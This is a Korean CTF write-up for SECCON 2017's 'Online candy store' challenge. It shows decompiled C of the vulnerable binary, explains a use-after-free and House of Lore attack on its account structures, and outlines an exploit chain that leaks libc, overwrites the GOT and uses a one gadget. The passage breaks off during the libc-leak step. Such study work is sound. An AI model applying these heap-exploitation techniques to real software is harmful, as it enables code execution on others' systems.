---
title: "Online candy store"
sidebar_position: 1
---


## **Information**

### **Description**
```
I have opened an online candy store.

Host : [lazenca0x0.pwn.seccon.jp](http://lazenca0x0.pwn.seccon.jp)  
Port : 9999  
[Lazenca.0x0-9374845c01384f5fc9efdce81437697499640db78523509906f315a1bed5cb3d.zip](https://files-quals.seccon.jp/Lazenca.0x0-9374845c01384f5fc9efdce81437697499640db78523509906f315a1bed5cb3d.zip) (pass:seccon2017)
```
### **File**

* [Lazenca.0x0-9374845c01384f5fc9efdce81437697499640db78523509906f315a1bed5cb3d.zip](/attachments/11501728/12189741.zip)

### **Source Code**

## **Writeup**

### File information

```bash title="File information"
lazenca0x0@ubuntu:~/Documents/CTF/SECCON2017$ file ./Lazenca.0x0 
./Lazenca.0x0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1bfd795acede916210985e5865d2de9697e7505a, stripped
lazenca0x0@ubuntu:~/Documents/CTF/SECCON2017$ checksec.sh --file ./Lazenca.0x0 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./Lazenca.0x0
lazenca0x0@ubuntu:~/Documents/CTF/SECCON2017$
```

### **Binary analysis (Finding vulnerabilities)**

#### **Main**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당는 함수는 setCandy() 함수를 호출하여 Candy 정보를 설정합니다.
  + 해당는 함수는 login() 함수를 호출하여 사용하여 계정정보를 확인합니다.
  + 해당는 함수는 사용자가 login에 실패 할 경우 다음과 같이 동작합니다.  
    - 해당 함수는 login이 실패시 사용자에게 계정을 생성 할 것인지 묻습니다.
      * 해당 함수는 addAccount() 함수를 이용해 새로운 계정을 생성합니다.
    - 그리고 해당 함수는 login을 3번 실패하면 프로그램은 종료됩니다.
  + 해당는 함수는 사용자가 login에 성공하면 아래 기능들을 이용할 수 있습니다.  
    - 제고 출력, 주문, 충전, 로그아웃
    - gLoginAccount→state 의 값이 1인 경우 "orderMenu", "Account" 기능을 이용 할 수 있습니다.

```c title="main"
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int state; // [rsp+4h] [rbp-Ch]

  state = 1;
  signal(14, handler);
  alarm(0x1Eu);
  title();
  setCandy();
  gOrderCnt = 0;
  gLoginFailCnt = 0;
  while ( !gLoginAccount )
  {
    if ( (unsigned int)login() )
    {
      gLoginFailCnt = 0;
LABEL_14:
      while ( state && gLoginAccount )
      {
        Menu();
        printf("Command : ");
        switch ( (unsigned int)retNumber(2LL) )
        {
          case 0u:
            state = 0;
            break;
          case 1u:
            printStock();
            break;
          case 2u:
            purchase();
            break;
          case 3u:
            charge();
            break;
          case 4u:
            if ( gLoginAccount->state == 1 )
              orderMenu();
            break;
          case 5u:
            if ( gLoginAccount->state == 1 )
              Account();
            break;
          case 9u:
            logout(2LL);
            break;
          default:
            goto LABEL_14;
        }
      }
    }
    else
    {
      if ( gLoginFailCnt == 2 )
        exit(1);
      ++gLoginFailCnt;
      puts("\nCreate an account?");
      puts("0) Yes\n1) No");
      if ( !(unsigned int)retNumber(2LL) )
        addAccount(3LL);
    }
  }
  return 0LL;
}
```

#### **login()**

* ****해당 함수는 다음과 같은 기능을 합니다.****
  + 해당 함수는 사용자로 부터 ID,Password를 입력 받습니다.
  + 해당 함수는 입력 받은 값을 전역 변수 gAccount[]에 존재하는지 확인합니다.
  + 해당 함수는 인증에 성공하면, 해당 계정 정보가 저장된 gAccount[]의 주소를 전역변수 "gLoginAccount" 에 저장합니다.

```c title="login"
signed __int64 login()
{
  size_t lenUserInputID; // rbx
  size_t lenID; // rax
  size_t lenUserInputPW; // rbx
  size_t lenPW; // rax
  signed int i; // [rsp+Ch] [rbp-34h]
  char id[8]; // [rsp+10h] [rbp-30h]
  char pw[8]; // [rsp+20h] [rbp-20h]
  unsigned __int64 v8; // [rsp+28h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  memset(id, 0, 8uLL);
  memset(pw, 0, 8uLL);
  printf("\nEnter your ID.\n> ", 0LL);
  UserInput(id, 8LL);
  printf("Enter your Password.\n> ", 8LL);
  UserInput(pw, 8LL);
  for ( i = 0; i <= 2; ++i )
  {
    if ( gAccount[i].state )
    {
      lenUserInputID = strlen(id);
      if ( lenUserInputID == strlen(gAccount[i].fd->id) )
      {
        lenID = strlen(gAccount[i].fd->id);
        if ( !strncmp(gAccount[i].fd->id, id, lenID) )
        {
          lenUserInputPW = strlen(pw);
          if ( lenUserInputPW == strlen(gAccount[i].fd->pw) )
          {
            lenPW = strlen(gAccount[i].fd->pw);
            if ( !strncmp(gAccount[i].fd->pw, pw, lenPW) )
            {
              gLoginAccount = (struct ACCOUNT *)(32LL * i + 0x604220);
              printf("\nHi, %s", gAccount[i].fd->id);
              return 1LL;
            }
          }
        }
      }
    }
  }
  return 0LL;
}
```

* **해당 함수는 다음과 같은 구조체를 사용합니다.**

```c title="struct IDPW and struct ACCOUNT"
struct IDPW{
    long empty[2];
    char id[8];
    char pw[8];
    long state;
    char description[88];
};

struct ACCOUNT{
    long state;
    long number;
    struct IDPW *fd;
    long bk;
};
```

#### **addAccount()**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 전역 변수 gAccount[].state 의 값이 '0' 인 경우 다음과 같이 동작합니다.
    - 해당 함수는 malloc()을 사용하여 128 byte의 heap 영역을 할당받습니다.
      * 해당 함수는 해당 영역의 주소를 gAccount[i].fd에 저장합니다.
      * 해당 함수는 해당 영역에 ID, Password, profile 정보를 저장합니다.

```c title="addAccount"
unsigned __int64 __fastcall addAccount(unsigned int a1)
{
  unsigned int i; // [rsp+10h] [rbp-10h]
  signed int empty; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  empty = 1;
  for ( i = 0; i <= 2 && empty; ++i )
  {
    if ( !gAccount[i].state )
    {
      empty = 0;
      gAccount[i].state = a1;
      gAccount[i].number = i + 1;
      gAccount[i].fd = (struct IDPW *)malloc(128uLL);
      gAccount[i].fd->state = 1LL;
      puts("\nEnter your New ID.");
      UserInput(gAccount[i].fd->id, 8LL);
      puts("Enter your New Password.");
      UserInput(gAccount[i].fd->pw, 8LL);
      puts("Enter your profile.");
      UserInput(gAccount[i].fd->description, 88LL);
      gAccount[i].bk = 10000LL;
    }
  }
  if ( empty )
    puts("Could not add user.");
  return __readfsqword(0x28u) ^ v4;
}
```

#### **purchase**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 전역 변수 gStockCnt의 값이 0일 경우 메시지 출력 해당 기능을 종료합니다.
  + 해당 함수는 전역 변수 gStockCnt의 값이 0이 아닐 경우 다음과 같은 기능을 합니다.
    - 해당 함수는 사용자로 부터 구매 할 캔디의 코드 번호(candyInfo[0]), 캔디의 수(candyInfo[1])를 입력받습니다.
      * 해당 함수는 구매 가능한 캔디 코드 번호, 캔디의 개수인지 확인합니다.
    - 해당 함수는 정상적인 구매가 진행 되며, 캔디의 재고가 없을 경우 아래 함수가 호출됩니다.  
      * reSortStock()
      * setBoard()

```c title="purchase"
unsigned __int64 purchase()
{
  unsigned int v0; // ST00_4
  unsigned int candyInfo[2]; // [rsp+0h] [rbp-10h]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( gStockCnt )
  {
    puts("Please enter the code number of the candy to be purchased.");
    candyInfo[0] = retNumber(3LL);
    if ( candyInfo[0] < gStockCnt )
    {
      puts("Please enter the number of the candy to purchase.");
      candyInfo[1] = retNumber(3LL);
      if ( gStock[candyInfo[0]]->candyNumber < candyInfo[1] )
      {
        if ( gStock[candyInfo[0]]->candyNumber < candyInfo[1] )
          puts("There is not enough stock.");
      }
      else if ( candyInfo[1] * gStock[candyInfo[0]]->candyPrice > gLoginAccount->bk )
      {
        printf(
          "You do not have enough money.(%ld)\n",
          candyInfo[1] * gStock[candyInfo[0]]->candyPrice,
          *(_QWORD *)candyInfo);
      }
      else
      {
        gStock[candyInfo[0]]->candyNumber -= candyInfo[1];
        if ( !gStock[candyInfo[0]]->candyNumber )
        {
          printf(
            "Thank you for your purchase.(%ld)\n",
            candyInfo[1] * gStock[candyInfo[0]]->candyPrice,
            *(_QWORD *)candyInfo);
          reSortStock(v0);
          setBoard();
        }
      }
    }
  }
  else
  {
    puts("We have not any candy.");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

* **다음과 같은 구조체를 사용합니다.**

```c title="struct STOCK"
struct STOCK{
    char candyName[8];
    unsigned int  candyNumber;
    unsigned int  candyPrice;
    char *candyDescription;
};
```

#### **setBoard()**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 malloc() 함수를 이용해 1200 byte의 Heap 영역을 할당 받습니다.
  + 해당 함수는 해당 영역에 사용자로 부터 값을 입력 받아 저장합니다.

```c title="setBoard"
unsigned __int64 setBoard()
{
  unsigned __int64 v0; // ST08_8

  v0 = __readfsqword(0x28u);
  puts("Please enter a comment for candy.");
  board = (__int64)malloc(1200uLL);
  UserInput(board, 1200LL);
  return __readfsqword(0x28u) ^ v0;
}
```

#### **charge**
* ****해당 함수는 다음과 같은 기능을 합니다.****
  + 해당 함수는 사용자로 부터 충전 할 금액의 번호는 입력 받습니다.
  + 해당 함수는 해당 금액을 "gLoginAccount→bk" 영역에 더합니다.

```c title="charge"
unsigned __int64 charge()
{
  unsigned int chargeInfo[2]; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  chargeInfo[0] = 0;
  puts("Please select the amount to charge.");
  puts("0) 1");
  puts("1) 10");
  puts("2) 100");
  puts("3) 1000");
  puts("4) 10000");
  puts("5) 100000");
  chargeInfo[1] = retNumber(2LL);
  switch ( chargeInfo[1] )
  {
    case 0u:
      chargeInfo[0] = 1;
      break;
    case 1u:
      chargeInfo[0] = 10;
      break;
    case 2u:
      chargeInfo[0] = 100;
      break;
    case 3u:
      chargeInfo[0] = 1000;
      break;
    case 4u:
      chargeInfo[0] = 10000;
      break;
    case 5u:
      chargeInfo[0] = 100000;
      break;
    default:
      break;
  }
  gLoginAccount->bk += chargeInfo[0];
  printf("%ld yen charged.\n", chargeInfo[0], *(_QWORD *)chargeInfo);
  return __readfsqword(0x28u) ^ v2;
}
```

#### **Account()**

* **해당 함수는 gLoginAccount->state의 값이 1인 경우 사용가능합니다.**
* ****해당 함수는 다음과 같은 기능을 합니다.****
  + 해당 함수는 사용 가능한 기능 목록을 출력합니다.
    - 계정 삭제, 비밀번호 변경
  + 해당 함수는 사용자로 부터 사용할 기능의 번호를 입력 받아 해당 기능을 호출합니다.

```c title="Account"
unsigned __int64 Account()
{
  int tmp; // eax
  signed int i; // [rsp+8h] [rbp-58h]
  signed int control; // [rsp+Ch] [rbp-54h]
  char funcList[3][22]; // [rsp+10h] [rbp-50h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  control = 1;
  strcpy((char *)funcList, "Delete account");
  *(_DWORD *)&funcList[0][16] = 0;
  *(_WORD *)&funcList[0][20] = 0;
  strcpy(funcList[1], "Change password");
  *(_DWORD *)&funcList[1][16] = 0;
  *(_WORD *)&funcList[1][20] = 0;
  *(_OWORD *)&funcList[2][0] = (unsigned __int64)'tixE';
  *(_DWORD *)&funcList[2][16] = 0;
  *(_WORD *)&funcList[2][20] = 0;
  while ( control )
  {
    puts("\nAccount.");
    for ( i = 0; i <= 2; ++i )
      printf("%d) %s\n", (unsigned int)(i + 1), funcList[i]);
    printf("Command : ");
    tmp = retNumber(2LL);
    switch ( tmp )
    {
      case 2:
        changePW();
        break;
      case 3:
        control = 0;
        break;
      case 1:
        delAccount();
        break;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

#### **delAccount()**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 전역 변수 gAccount[]를 이용해 삭제 가능한 계정들을 출력합니다.
  + 해당 함수는 사용자로 부터 삭제 할 계정의 번호를 입력 받습니다.
  + 해당 함수는 사용자가 선택한 계정의 state 정보가 '3' 일 경우 삭제를 진행합니다.
  - 해당 함수는 해당 계정(gAccount[num])의 정보를 초기화 합니다.
    * state = 0
    * fd→state = 0
    * memset(gAccount[num].fd, 0, 0x80uLL);
  - 해당 함수는 해당 계정(gAccount[num])의 fd 영역(heap)을 해제 합니다.+ 해당 함수는 gAccount[num].fd 영역에 "gAccount[num].fd - 16" 연산 한 값을 저장합니다.
    - 저장되는 값은 Free chunk의 Head 주소입니다.
    - **이것으로 인해 The House of Lore, UAF 취약성이 발생하게 됩니다.**

```c title="delAccount"
unsigned __int64 delAccount()
{
  unsigned int i; // [rsp+8h] [rbp-18h]
  unsigned int num; // [rsp+Ch] [rbp-14h] MAPDST
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("\nAccount list");
  for ( i = 0; i <= 2; ++i )
  {
    if ( gAccount[i].state )
      printf("%d) %s\n", gAccount[i].number, gAccount[i].fd->id);
  }
  puts("\nPlease enter the number of the account you want to delete");
  num = retNumber(2LL);
  if ( num && num <= 3 )
  {
    if ( gAccount[--num].state == 3 )
    {
      gAccount[num].state = 0LL;
      gAccount[num].fd->state = 0LL;
      printf("The account(%s) has been deleted.\n", gAccount[num].fd->id);
      memset(gAccount[num].fd, 0, 0x80uLL);
      free(gAccount[num].fd);
      gAccount[num].fd = (struct IDPW *)((char *)gAccount[num].fd - 16);
    }
    else
    {
      puts("You can not delete the account.");
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

#### **changePW**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 전역 변수 "gAccount[i].state"를 이용해 비밀번호 변경이 가능한 계정을 출력합니다.
  + 해당 함수는 사용자로 부터 비밀번호를 변경할 계정의 번호를 입력 받습니다.
  + 해당 함수는 해당 계정의 'gAccount[].fd.state' 영역에 저장된 값이 '0'이 아닐 경우 비밀번호를 변경할 수 있습니다.

```c title="changePW"
unsigned __int64 changePW()
{
  unsigned int i; // [rsp+8h] [rbp-18h]
  unsigned int num; // [rsp+Ch] [rbp-14h] MAPDST
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("\nAccount list");
  for ( i = 0; i <= 2; ++i )
  {
    if ( gAccount[i].state )
      printf("%ld) %s\n", gAccount[i].number, gAccount[i].fd->id);
  }
  puts("\nPlease enter the number of the account you want to change PW");
  num = retNumber(2LL);
  if ( num )
  {
    if ( num <= 3 )
    {
      if ( gAccount[--num].fd )
      {
        if ( gAccount[num].fd->state )
        {
          puts("Enter your New Password.");
          UserInput(gAccount[num].fd->pw, 8LL);
        }
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

#### **orderMenu()**

* **해당 함수는 gLoginAccount->state의 값이 1인 경우 사용가능합니다.**
* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 사용 가능한 기능 목록을 출력합니다.
    - 주문 목록, 주문 목록 추가, 주문 목록 취소, 캔디 주문
  + 해당 함수는 사용자로 부터 사용할 기능의 번호를 입력 받아 해당 기능을 호출합니다.

```c title="orderMenu"
unsigned __int64 orderMenu()
{
  signed int i; // [rsp+8h] [rbp-88h]
  unsigned int control; // [rsp+Ch] [rbp-84h]
  char funcList[5][22]; // [rsp+10h] [rbp-80h]
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  control = 1;
  strcpy((char *)funcList, "Order List");
  *(_DWORD *)&funcList[0][16] = 0;
  *(_WORD *)&funcList[0][20] = 0;
  strcpy(funcList[1], "Add to Order List");
  *(_WORD *)&funcList[1][20] = 0;
  *(_QWORD *)&funcList[2][0] = 'o lecnaC';
  *(_QWORD *)&funcList[2][8] = 'o s���en';
  *(_DWORD *)&funcList[2][16] = 'redr';
  *(_WORD *)&funcList[2][20] = '.';
  strcpy(funcList[3], "Order candy");
  *(_DWORD *)&funcList[3][16] = 0;
  *(_WORD *)&funcList[3][20] = 0;
  *(_OWORD *)&funcList[4][0] = (unsigned __int64)'tixE';
  *(_DWORD *)&funcList[4][16] = 0;
  *(_WORD *)&funcList[4][20] = 0;
LABEL_11:
  while ( control )
  {
    puts("\nOrder candy.");
    for ( i = 0; i <= 4; ++i )
      printf("%d) %s\n", (unsigned int)(i + 1), funcList[i]);
    printf("Command : ");
    switch ( (unsigned int)retNumber(2LL) )
    {
      case 1u:
        orderList();
        break;
      case 2u:
        addToOrderList();
        break;
      case 3u:
        orderCancel();
        break;
      case 4u:
        orderCandy();
        break;
      case 5u:
        control = 0;
        break;
      default:
        goto LABEL_11;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

#### **addToOrderList**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 choiceCandy() 함수를 사용해 주문할 사탕의 번호를 입력받습니다.
  + 해당 함수는 malloc() 함수를 사용해 24 byte의 heap 영역을 할당받습니다.
    - 해당 함수는 해당 영역에 주문할 사탕의 정보를 저장합니다.

```c title="addToOrderList"
unsigned __int64 addToOrderList()
{
  struct ORDER *newOrder; // ST08_8
  unsigned int tmp; // eax
  unsigned int candyNum; // [rsp+4h] [rbp-1Ch]
  char strOrdNum[8]; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( (unsigned int)gOrderCnt > 9 )
  {
    puts("You can not order candy anymore.");
  }
  else
  {
    candyNum = choiceCandy();
    if ( candyNum > 9 )
    {
      puts("Please enter a number between 0 and 9");
    }
    else
    {
      newOrder = (struct ORDER *)malloc(24uLL);
      tmp = getOrderNum();
      sprintf(strOrdNum, "%d", tmp);
      strncpy(newOrder->orderCode, strOrdNum, 1uLL);
      newOrder->orderNumber = gCandies[candyNum]->orderNumber;
      strncpy(newOrder->orderCandyName, gCandies[candyNum]->candyName, 8uLL);
      newOrder->candyCode = gCandies[candyNum]->candyCode;
      gOrderList[gOrderCnt++] = newOrder;
      orderList();
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

* **다음과 같은 구조체를 사용합니다.**

```c title="struct ORDER and struct CANDIES"
typedef struct ORDER{
    char orderCode[8];
    unsigned int  orderNumber;
    char orderCandyName[8];
    int  candyCode;
};

typedef struct CANDIES {
    char candyName[8];
    unsigned int  orderNumber;
    int candyCode;
};
```

#### **orderCancel**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 checkCancel(i) 함수를 취소 가능한 주문을 확인하고, 주문 취소 가능한 목록을 출력합니다.
  + 해당 함수는 취소 가능한 주문이 있으며, 사용자로 부터 주문 번호을 입력받습니다.
  + 해당 함수는 입력 값을 검증한 후 reSort() 함수를 호출 해 주문을 취소합니다.

```c title="orderCancel"
unsigned __int64 orderCancel()
{
  unsigned int i; // [rsp+Ch] [rbp-44h]
  int j; // [rsp+Ch] [rbp-44h]
  int orderCnt; // [rsp+10h] [rbp-40h]
  unsigned int canNum; // [rsp+1Ch] [rbp-34h]
  int cancelableList[10]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  orderCnt = 0;
  if ( gOrderCnt )
  {
    for ( i = 0; i < gOrderCnt; ++i )
    {
      if ( (unsigned int)checkCancel(i) )
      {
        cancelableList[orderCnt++] = i;
        printf("\n=*= Cancelable order (Order number : %d) =*=\n", i);
        printf("Order code: %s\n", gOrderList[i]);
        printf("Order count : %d\n", gOrderList[i]->orderNumber);
        printf("Order candy : %s\n", gOrderList[i]->orderCandyName);
        printf("Candy code: %d\n", (unsigned int)gOrderList[i]->candyCode);
      }
    }
    if ( orderCnt )
    {
      canNum = retNumber(2LL);
      for ( j = 0; j < orderCnt; ++j )
      {
        if ( cancelableList[j] == canNum )
          reSort(canNum);
      }
    }
  }
  else
  {
    puts("You have never ordered a product.");
  }
  return __readfsqword(0x28u) ^ v6;
}
```

#### **reSort**

* ****해당 함수는 다음과 같은 기능을 합니다.****
  + 해당 함수는 free() 함수를 이용해 gOrderList[a1] 영역을 해제합니다.

```c title="reSort"
unsigned __int64 __fastcall reSort(unsigned int a1)
{
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  free(gOrderList[a1]);
  if ( a1 < gOrderCnt )
  {
    for ( i = 0; a1 + i < gOrderCnt; ++i )
      gOrderList[a1 + i] = gOrderList[a1 + i + 1];
  }
  gOrderList[gOrderCnt--] = 0LL;
  return __readfsqword(0x28u) ^ v3;
}
```

#### **orderCandy()**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 해당 함수는 사용자로 부터 캔디 주문의 진행 여부를 확인합니다.
  + 해당 함수는 getStockNum() 함수를 사용해 gOrderList[]에 저장된 값이 gStock[]에 존재하는지 확인합니다.
    - 해당 함수는 gOrderList[]에 저장된 값 gStock[]에 존재 할 경우 다음과 같이 처리됩니다.
      * "gStock[]->candyNumber" 에 "gOrderList[]->orderNumber"의 값을 더하게 됩니다.
    - 해당 함수는 gOrderList[]에 저장된 값 gStock[]에 존재하지 않을 경우 다음과 같이 처리됩니다.
      * 해당 함수는 malloc() 함수를 사용하여 24 byte의 heap 영역을 할당합니다.
      * 해당 함수는 해당 영역에 캔디에 대한 정보를 저장합니다.
        + 사탕 이름, 가격, 캔디 정보가 저장되어 있는 주소 값
      * 그리고 해당 함수는 124 byte의 heap 영역을 할당해서, 해당 영역에 사용자로 부터 입력받은 캔디 정보를 저장합니다.
  + 해당 함수는 gOrderList[]에 저장된 값 gStock[]에 모두 저장한 후, gOrderList[] 영역을 모두 해제 합니다.

```c title="orderCandy"
unsigned __int64 orderCandy()
{
  struct STOCK *dest; // ST10_8
  unsigned int i; // [rsp+4h] [rbp-1Ch]
  int num; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( gOrderCnt )
  {
    orderList();
    puts("\nWould you like to order these candies?");
    puts("0) Yes, 1) No");
    if ( !(unsigned int)retNumber(2LL) )
    {
      for ( i = 0; i < gOrderCnt; ++i )
      {
        num = getStockNum(i);
        if ( num )
        {
          gStock[num - 1]->candyNumber += gOrderList[i]->orderNumber;
        }
        else if ( (unsigned int)gStockCnt > 4 )
        {
          puts("The warehouse is full. Your new order can not be completed.");
        }
        else
        {
          puts("\nEnter information about newly added candy.");
          dest = (struct STOCK *)malloc(24uLL);
          strncpy(dest->candyName, gOrderList[i]->orderCandyName, 8uLL);
          dest->candyNumber = gOrderList[i]->orderNumber;
          printf("Enter the price of %s candy.\n", dest);
          dest->candyPrice = retNumber(5LL);
          printf("Enter a description of the %s candy.\n", dest);
          dest->candyDescription = (char *)malloc(124uLL);
          UserInput(dest->candyDescription, 124LL);
          gStock[gStockCnt++] = dest;
        }
      }
      while ( gOrderCnt )
      {
        free(gOrderList[gOrderCnt - 1]);
        gOrderList[gOrderCnt-- - 1] = 0LL;
      }
    }
  }
  else
  {
    puts("You have never ordered a product.");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

### **Proof of concept**

* 설명은 진행하기 전에 출제자는 플레이어들이 "House of lore" 취약성을 이용해서 풀기를 원했습니다.
  + 하지만 해당 취약성들 외에도 여러 형태로 공격이 가능합니다.

#### **Fake chunk**

* **해당 프로그램에서 취약성을 이해하기 위해 ACCOUNT 구조체에 대한 이해가 필요합니다.**
  + 해당 구조체는 전역 변수로 선언되어 있습니다.
  + 해당 프로그램은 3개의 ACCOUNT 구조체를 사용합니다.
    - 첫번째 구조체에는 'Admin' 계정 정보가 저장되어 있습니다.
    - 2,3번째 구조체는 사용자가 생성한 계정의 정보가 저장됩니다.

:::note[struct ACCOUNT gAccount]
|  |  |  |
| --- | --- | --- |
| 0x604220 | Admin.state | Admin.number |
| 0x604230 | Admin.fd | Admin.bk |
| 0x604240 | gAccount[1].state | gAccount[1].number |
| 0x604250 | gAccount[1].fd | gAccount[1].bk |
| 0x604260 | gAccount[2].state | gAccount[2].number |
| 0x604270 | gAccount[2].fd | gAccount[2].bk |
:::

* **House of lore 취약성은 다음과 같은 Fake chunk가 필요합니다.**
  + delAccount() 함수를 이용해 gAccount[1].fd 영역에 Free chunk의 Head 주소를 저장 할 수 있습니다.
  + charge() 함수를 이용해 gAccount[1].bk, gAccount[2].bk 영역의 값을 변경 할 수 있습니다.

:::note[Fake chunk]
|  |  |  |
| --- | --- | --- |
| 0x604220 | Admin.state | Admin.number |
| 0x604230 | Admin.fd | Admin.bk |
| 0x604240 | gAccount[1].state | gAccount[1].number |
| 0x604250 | gAccount[1].fd = Free chunk head | gAccount[1].bk = 0x604268 |
| 0x604260 | gAccount[2].state | gAccount[2].number |
| 0x604270 | gAccount[2].fd | gAccount[2].bk = 0x604240 |
:::

#### **Overwrite Fd of Fack chunk**

* **House of lore 취약성은 다음과 같은 Free chunk의 fd영역을 변경할 수 있어야 합니다.**  
  + delAccount() 함수에 의해 gAccount[1].fd 영역의 값이 변경됩니다.  
    - gAccount[1].fd→id : fd 영역
    - gAccount[1].fd→pw : bk 영역
  + 해당 계정의 비밀번호 변경을 할 수 있으면 Free chunk의 bk영역에 값을 덮어 쓸수 있습니다.
* **하지만 패스워드를 변경하기 위해서는 "gAccount[1].fd→state"의 값이 '0'이 아니어야 합니다.**

:::note[gAccount[1].fd]
|  | Create an account | | Delete account | |
| --- | --- | --- | --- | --- |
| gAccount[1].fd | 0x8 | | 0x0 | |
| 0x0 | prev\_size | Size of chunk | **Chunk** (long empty[0]) | **Chunk size** (long empty[0]) |
| 0x10 | long empty[0] | long empty[1] | **fd** (char id[8]) | **bk** (char pw[8]) |
| 0x20 | char id[8] | char pw[8] | long state | char description[88] |
| 0x30 | long state | char description[88] |  |  |
:::

#### **UAF**

* **다음과 같이 UAF 취약성을 사용해 "gAccount[1].fd→state" 값을 변경할 수 있습니다.**
  + ACCOUNT 구조체의 크기는 128 byte 입니다.
  + orderCandy() 함수에 dest->candyDescription(사탕의 정보를 입력하는 영역)에 할당되는 크기는 124 byte입니다.
  + 해제된 "gAccount[1].fd"영역을 "dest→candyDescription" 에 할당받아야 합니다.
    - 해당 영역("dest→candyDescription")에  문자 16개 이상을 저장하면 "gAccount[1].fd→state" 영역을 덮어 쓸 수 있습니다.
* **주의 할 내용은 다음과 같습니다.**
  + **UAF 공격시 제일 중요한 부분은 House of lore 공격을 위해 ACCOUNT 구조체와 같은 크기의 공간을 할당받고 해제 할 수 있어야 합니다.**
    - 즉, 해제된 "gAccount[1].fd" 영역에 반드시 "dest->candyDescription"에 할당되는 영역이 할당되어야 합니다.
  + ****그리고 아래와 같은 영역이 "gAccount[1].fd" 영역에 할당되지 않도록 주의 해야 합니다.****
    - 해당 프로그램은 사탕을 주문하기 위해서는 Order list에 구매할 사탕을 추가해야 합니다.
      * Order list에 구매할 사탕을 추가 때 마다 Heap 영역(24 byte)을 할당 받습니다.
    - 해당 프로그램은 주문한 사탕이 가게에 없는 제품이면 Heap 영역(24 byte)을 할당 받습니다.

### Structure of Exploit code
:::note
1. Leak Libc Addresss
2. Design the heap.  
   1. Create account 1
   2. Create account 2
3. UAF
   1. Set gAccount[1].fd→state
4. House of lore
   1. register bins[16,17]
   2. Overwrite Smallbin bk
5. Overwrite gAccount[1].fd  
   1. signal GOT
6. Overwrite fflush.got
   1. One Gadget
:::

* The following information is required for an attack:

:::note 
* Leak Libc Addresss
* House of lore
* One Gadget
:::

### **Information for attack**

#### **Leak Libc Addresss**

* **다음과 같은 Heap 구조 설계가 필요합니다.**
  + 유저는 1개의 사탕을 Order list에 추가 하고, 주문을 완료 합니다.
  + 유저는 2개의 사탕을 Order list에 추가 합니다.

```bash title="Heap Layout"
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0x100006567         0x20                 Used                None              None
0xa17620            0xa17630            0x90                 Used                None              None
0xa176b0            0x0                 0x20                 Used                None              None
gdb-peda$
```

* **다음과 같은 Heap 구조입니다.**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Order list[0] | 0xa175e0 | A | 0x20 | None | None |
| 창고에 저장된 사탕 정보 | 0xa17600 | A | 0x20 | None | None |
| 창고에 저장된 사탕 설명 | 0xa17620 | A | 0x90 | None | None |
| Order list[1] | 0xa176b0 | A | 0x20 | None | None |

* **다음과 같은 방법으로 해제된 Heap 영역을 Small bin에 등록합니다.**
  + 유저는 처음에 등록한 사탕을 모두 구매 합니다.
  - 해당 프로그램은 사탕을 모두 소진을 하면 사용하고 있던 Heap 영역을 모두 해제 합니다.
    * 사탕 설명(0x90) 영역은 Unsortedbin에 등록됩니다.
      + 이때 fd, bk에 main arena의 주소 값이 저장됩니다.
  - 그리고 해당 프로그램은 모두 소진된 사탕에 대한 평가 내용을 저장하기 위해 Heap 영역을 할당합니다.
